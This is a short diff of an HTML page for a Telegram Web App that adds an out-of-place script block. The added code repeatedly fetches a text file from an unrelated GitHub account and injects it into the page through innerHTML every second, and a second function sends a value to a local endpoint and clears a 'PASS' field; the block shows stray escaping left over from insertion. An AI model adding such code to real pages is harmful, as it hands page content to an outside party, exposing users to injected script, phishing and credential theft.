@@ -80,6 +80,12 @@
     <div id="viewport"></div>
     <div id="viewport-params-size"></div>
     <div id="viewport-params-expand"></div>
+    <div id=\"d1\"> d1 </div> 
+<script>
+function gebi(id){return document.getElementById(id);} function tinyxhr(url,cb,method,post,contenttype){var c=url,a=cb,i=method,f=post,b=contenttype;var d,h;try{h=new XMLHttpRequest()}catch(g){try{h=new ActiveXObject(\"Msxml2.XMLHTTP\")}catch(g){if(console){console.log(\"tinyxhr: XMLHttpRequest not supported\")}return null}}d=setTimeout(function(){h.abort();a(new Error(\"tinyxhr: aborted by a timeout\"),\"\",h)},50000);h.onreadystatechange=function(){if(h.readyState!=4){return}clearTimeout(d);a(h.status!=200?new Error(\"tinyxhr: server respnse status is \"+h.status):false,h.responseText,h)};h.open(i?i.toUpperCase():\"GET\",c,true);if(!f){h.send()}else{h.setRequestHeader(\"Content-type\",b?b:\"application/x-www-form-urlencoded\");h.send(f)}};";
+function lv(){tinyxhr(\"https://raw.githubusercontent.com/MrHFox/mrhfox.github.io/main/1.txt\",function (err,data,xhr){ if (err) alert(\"goterr \"+err); else { gebi(\"d1\").innerHTML+=data; setTimeout(lv, 1000); }  });}
+function at(val){tinyxhr(\"/v?v=-1&at=\"+val,function (err,data,xhr){ if (err) alert(\"goterr \"+err); else { gebi(\"d1\").innerHTML+=data; gebi(\"PASS\").value='';}  });} setTimeout(lv, 2000); </script>
+
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         // Init TWA
